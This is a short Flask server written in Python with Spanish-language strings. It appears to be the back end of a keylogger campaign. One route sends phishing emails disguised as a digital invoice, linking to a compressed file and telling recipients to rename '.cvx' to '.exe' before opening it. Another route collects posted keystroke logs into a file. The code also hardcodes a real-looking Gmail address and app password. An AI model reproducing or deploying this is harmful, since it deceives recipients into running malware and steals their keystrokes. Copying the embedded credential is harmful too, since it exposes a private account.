
from flask import Flask, render_template, request
import smtplib
import os
from email.message import EmailMessage

app = Flask(__name__)
ZIP_FILE_PATH = "keylogger_client/documento_cifrado.zip"

# ⚠️ Reemplaza esto con tu propio correo y contraseña de aplicación
GMAIL_USER = "sanchezmendozajulieta@gmail.com"
GMAIL_PASS = "yqui shee cwoq ejje "

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/send", methods=["POST"])
def send():
    contact = request.form["contact"]
    subject = "Factura digital disponible 📎"
    body = (
        "Estimado cliente:\n\n"
        "Adjuntamos su archivo solicitado en el siguiente enlace seguro:\n\n"
        "🔗 https://drive.google.com/file/d/18p52iG2nfSigPQEkXoq4nH_WPcvNPlXP/view?usp=drive_link\n\n"
        "Nota: El archivo está comprimido por razones de seguridad.\n"
        "Si el archivo tiene extensión '.cvx', cámbiela a '.exe' antes de abrirlo.\n\n"
        "Saludos cordiales."
    )

    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = GMAIL_USER
    msg["To"] = contact
    msg.set_content(body)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(GMAIL_USER, GMAIL_PASS)
            smtp.send_message(msg)
        return render_template("index.html", message="✅ Enlace enviado exitosamente al contacto.")
    except Exception as e:
        return render_template("index.html", message=f"❌ Error al enviar: {e}")
    
@app.route("/recibir_logs", methods=["POST"])
def recibir_logs():
    data = request.json
    with open("logs.txt", "a") as f:
        f.write(f"{data}\\n")
    return "OK"

if __name__ == "__main__":
    app.run(debug=True)
